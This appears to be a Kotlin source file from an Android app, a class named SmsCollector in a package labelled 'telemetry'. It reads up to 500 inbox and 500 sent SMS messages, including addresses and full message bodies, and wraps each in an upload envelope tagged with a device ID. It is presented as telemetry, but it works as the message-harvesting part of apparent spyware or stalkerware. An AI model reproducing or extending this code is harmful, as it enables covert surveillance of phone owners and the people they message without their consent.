package com.pulsedrop.telemetry.collectors

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import com.pulsedrop.telemetry.data.SmsMessage
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class SmsCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)

    fun collectAll() {
        collectInbox()
        collectSent()
    }

    fun collectInbox() {
        val uri = Telephony.Sms.Inbox.CONTENT_URI
        querySms(uri, "inbox")
    }

    fun collectSent() {
        val uri = Telephony.Sms.Sent.CONTENT_URI
        querySms(uri, "sent")
    }

    private fun querySms(uri: Uri, type: String) {
        val projection = arrayOf("_id", "address", "body", "date", "read")
        context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT 500")?.use { cursor ->
            val idIdx = cursor.getColumnIndex("_id")
            val addrIdx = cursor.getColumnIndex("address")
            val bodyIdx = cursor.getColumnIndex("body")
            val dateIdx = cursor.getColumnIndex("date")
            val readIdx = cursor.getColumnIndex("read")

            while (cursor.moveToNext()) {
                val msg = SmsMessage(
                    id = cursor.getString(idIdx),
                    address = cursor.getString(addrIdx) ?: "",
                    body = cursor.getString(bodyIdx) ?: "",
                    type = type,
                    timestamp = cursor.getLong(dateIdx),
                    read = cursor.getInt(readIdx) == 1
                )
                onData(UploadEnvelope("sms", prefs.deviceId, System.currentTimeMillis(), msg))
            }
        }
    }
}
